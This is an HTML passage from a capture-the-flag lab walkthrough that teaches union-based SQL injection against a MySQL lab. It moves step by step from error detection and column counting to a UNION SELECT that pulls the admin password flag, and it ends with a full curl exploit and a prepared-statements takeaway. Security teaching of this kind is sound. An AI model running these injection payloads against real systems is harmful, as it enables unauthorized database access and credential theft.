<h4>Step 1: Detect the Injection Point</h4>
<p>
    Enter a single quote <code>'</code> in the User ID field.
    If the application returns a MySQL error, the input is being concatenated
    directly into the SQL query without sanitization.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near <strong>'admin''</strong> at line 1
    </div>
</div>

<p>
    The error confirms injection. Notice the <code>'admin''</code> fragment --
    it shows our quote broke the string, and the <code>AND username != 'admin'</code>
    part of the query is leaking out.
</p>

<h4>Step 2: Determine the Number of Columns</h4>
<p>
    Use <code>ORDER BY</code> to find how many columns the original query returns.
    Increment the number until you get an error. We close the string with <code>'</code>
    and comment out the rest with <code>-- -</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1' ORDER BY 1 -- -&nbsp;&nbsp;&nbsp; &#10004; Username: alice &bull; Password: alice_sunny_42 &bull; Email: alice@example.com<br>
        <span class="prompt">Input: </span>1' ORDER BY 2 -- -&nbsp;&nbsp;&nbsp; &#10004; Username: alice &bull; Password: alice_sunny_42 &bull; Email: alice@example.com<br>
        <span class="prompt">Input: </span>1' ORDER BY 3 -- -&nbsp;&nbsp;&nbsp; &#10004; Username: alice &bull; Password: alice_sunny_42 &bull; Email: alice@example.com<br>
        <span class="prompt">Input: </span>1' ORDER BY 4 -- -&nbsp;&nbsp;&nbsp; &#10008; <strong>Unknown column '4' in 'ORDER BY'</strong><br><br>
        <span class="prompt">Result: </span>The query returns <strong>3 columns</strong>.
    </div>
</div>

<h4>Step 3: Identify Visible Columns with UNION SELECT</h4>
<p>
    Use <code>UNION SELECT</code> with 3 placeholder values. Make the first query
    return nothing by using an impossible ID, so only the UNION result shows.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Test UNION SELECT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT 'col1','col2','col3' -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> col1 &bull; <strong>Password:</strong> col2 &bull; <strong>Email:</strong> col3
    </div>
</div>

<p>
    All 3 columns are visible in the output. Column 1 maps to <code>Username</code>,
    column 2 maps to <code>Password</code>, and column 3 maps to <code>Email</code>.
</p>

<h4>Step 4: Extract the Admin Password</h4>
<p>
    The original query has <code>WHERE username != 'admin'</code>, which blocks admin data
    from appearing in normal lookups. But a <code>UNION SELECT</code> is a separate query --
    it is <strong>not affected</strong> by the original WHERE clause. We can query the
    <code>users</code> table directly.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract Admin Data</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT username, password, email FROM users WHERE username='admin' -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> admin &bull; <strong>Password:</strong> FLAG{sql1_un10n_m4st3r_2026} &bull; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the admin password <code>FLAG{sql1_un10n_m4st3r_2026}</code> and paste it into the
    verification form above.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab1" \<br> --data-urlencode "id=' UNION SELECT username, password, email FROM users WHERE username='admin' -- -"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Never concatenate user input into SQL queries.
    Use <strong>prepared statements</strong> with parameterized queries instead.
    The <code>UNION SELECT</code> technique bypasses any <code>WHERE</code> clause
    restrictions on the original query because it appends an entirely separate result set.
</div>
